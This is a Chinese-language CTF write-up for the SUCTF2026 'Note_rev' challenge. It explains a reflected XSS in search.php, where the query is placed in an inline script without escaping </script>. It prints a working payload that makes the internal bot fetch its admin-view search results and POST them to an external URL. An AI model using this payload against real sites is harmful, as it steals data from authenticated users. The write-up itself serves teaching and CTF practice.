# SUCTF2026-Note_rev

## 题目简述
题目是 Note 的 XSS 版本。题干说明 flag 存在 bot 的 notes 中，flag body 只包含 `0/1`，且不要爆破密码。`search.php?q=` 被直接拼入内联脚本 `const searchQuery = "..."`，未处理 `</script>`，可闭合脚本并插入新脚本。真正目标是让 bot 在内网同源页面执行 payload，读取管理员视角搜索结果并外带。

## 解题过程
/search.php 会将查询参数 q 直接拼进页面中的内联脚本：const searchQuery =
"...";

没有对 </script> 做安全处理，因此可以通过闭合原脚本标签并插入新的 <script>，实现反射型 XSS。

在公开站点上测试时，这个点表面上不容易直接得到有效结果；但真正的利用目标不是公网 10004，
而是 bot 所访问的内网：http://127.0.0.1:80/search.php?q=... 一旦 payload 在内网页
面中执行，就获得了该页面的同源权限，可以直接发起：fetch('/search.php?q=SUCTF') 从
而读取管理员视角下的搜索结果页面，再把 HTML 外带出去。

payload如下：

```javascript
</script><script>
(() => {
const w = 'https://';
fetch('/search.php?q=SUCTF')
.then(r => r.text())
.then(t => fetch(w, {
method: 'POST',
mode: 'no-cors',
headers: {'Content-Type': 'application/x-www-form-urlencoded'},
body: 'search=' + encodeURIComponent(t)
}));
})();
</script>
```

![SUNoterev 相关截图](SUCTF2026-Note_revWP/sunoterev.png)

## 方法总结
- 核心技巧：反射型 XSS 打内网 bot
- 识别信号：查询参数进入内联 JS 字符串且可闭合 script 标签。
- 复用要点：构造 `</script><script>...` payload，让 bot 访问内网同源地址并 fetch 敏感页面，再外带 HTML。
